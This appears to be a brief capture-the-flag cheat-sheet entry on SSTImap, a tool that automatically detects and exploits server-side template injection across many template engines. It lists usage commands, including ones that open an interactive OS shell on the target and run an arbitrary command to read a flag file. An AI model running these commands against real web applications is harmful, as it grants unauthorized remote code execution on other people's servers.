# SSTImap (and tplmap)

Automatic SSTI detection + exploitation for Jinja2, Twig, Mako, Smarty, EJS, Pug, Freemarker, ERB…

```bash
git clone https://github.com/vladko312/SSTImap && pip install -r SSTImap/requirements.txt
python SSTImap/sstimap.py -u "$T/page?name=*"                          # * = injection point
python SSTImap/sstimap.py -u "$T/report" -d 'header=*' -m POST
python SSTImap/sstimap.py -u ... --os-shell                            # interactive shell
python SSTImap/sstimap.py -u ... --os-cmd 'cat /flag/flag'
```
Manual first is usually faster for these challenges: [ssti](../05-injection/ssti.md) and
`scripts/injection/ssti_probe.py`.
